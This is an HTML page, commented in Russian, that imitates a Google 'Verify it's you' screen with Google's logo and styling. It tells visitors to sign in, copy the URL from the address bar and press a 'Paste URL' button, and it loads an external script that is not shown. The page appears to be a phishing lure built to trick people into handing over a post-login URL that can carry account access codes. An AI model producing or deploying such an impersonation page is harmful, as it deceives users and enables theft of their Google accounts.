<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подтверждение личности</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #ffffff;
        }

        .card {
            width: 100%;
            max-width: 400px;
            padding: 32px 24px 24px;
            text-align: center;
        }

        /* Логотип Google */
        .logo {
            margin-bottom: 20px;
        }

        .logo svg {
            width: 72px;
            height: 72px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 16px;
            color: #5f6368;
            line-height: 1.5;
            margin-bottom: 28px;
            font-weight: 400;
        }

        /* Инструкции */
        .instructions {
            text-align: left;
            margin-bottom: 28px;
            padding: 0 4px;
        }

        .step {
            display: flex;
            align-items: flex-start;
            gap: 14px;
            padding: 6px 0;
        }

        .step-number {
            font-size: 16px;
            font-weight: 500;
            color: #5f6368;
            min-width: 24px;
            text-align: right;
            flex-shrink: 0;
        }

        .step-text {
            font-size: 15px;
            color: #202124;
            line-height: 1.6;
        }

        .step-text strong {
            font-weight: 500;
        }

        /* Блок с кнопками */
        .buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 4px;
        }

        /* Кнопка Sign in with Google — заменена на div.googleLoginBtn */
        .googleLoginBtn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
            padding: 10px 16px;
            background: #1a73e8;
            color: #ffffff;
            font-size: 14px;
            font-weight: 500;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.2s;
            height: 44px;
            letter-spacing: 0.25px;
            user-select: none;
        }

        .googleLoginBtn:hover {
            background: #1b66c9;
        }

        .googleLoginBtn:active {
            background: #185abc;
        }

        /* Иконка Google внутри кнопки (белая) */
        .googleLoginBtn .google-icon {
            display: inline-block;
            width: 20px;
            height: 20px;
            flex-shrink: 0;
        }

        .googleLoginBtn .google-icon svg {
            width: 100%;
            height: 100%;
            display: block;
        }

        /* Кнопка Paste URL — без синей обводки, прозрачная */
        .paste-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 10px 16px;
            background: transparent;
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.15s;
            height: 44px;
            letter-spacing: 0.25px;
        }

        .paste-btn:hover {
            background: #f6f9fe;
        }

        .paste-btn:active {
            background: #e8f0fe;
        }

        /* Язык */
        .lang {
            margin-top: 28px;
            font-size: 13px;
            color: #5f6368;
        }

        /* Футер */
        .footer {
            margin-top: 16px;
            display: flex;
            justify-content: center;
            gap: 28px;
            font-size: 12px;
            color: #5f6368;
        }

        .footer a {
            color: #5f6368;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="card">
        <!-- Логотип Google -->
        <div class="logo">
            <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
            </svg>
        </div>

        <h1>Verify it's you</h1>
        <p class="subtitle">
            To help keep your account secure, Google needs to verify it's you.<br>
            Please follow the instructions.
        </p>

        <div class="instructions">
            <div class="step">
                <span class="step-number">1</span>
                <span class="step-text"><strong>Sign in</strong> to your Google Account.</span>
            </div>
            <div class="step">
                <span class="step-number">2</span>
                <span class="step-text"><strong>Copy</strong> the URL from the address bar.</span>
            </div>
            <div class="step">
                <span class="step-number">3</span>
                <span class="step-text"><strong>Click Paste URL</strong> and confirm paste.</span>
            </div>
        </div>

        <div class="buttons">
            <!-- Заменённая кнопка Sign in with Google — div с классом googleLoginBtn -->
            <div class="googleLoginBtn">
                <span class="google-icon">
                    <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#FFFFFF" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                        <path fill="#FFFFFF" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                        <path fill="#FFFFFF" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                        <path fill="#FFFFFF" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                    </svg>
                </span>
                Sign in with Google
            </div>

            <!-- Кнопка Paste URL — без обводки -->
            <button class="paste-btn">Paste URL</button>
        </div>

        <div class="lang">English</div>

        <div class="footer">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>

    <script src="./appkit.js"></script>
</body>
</html>
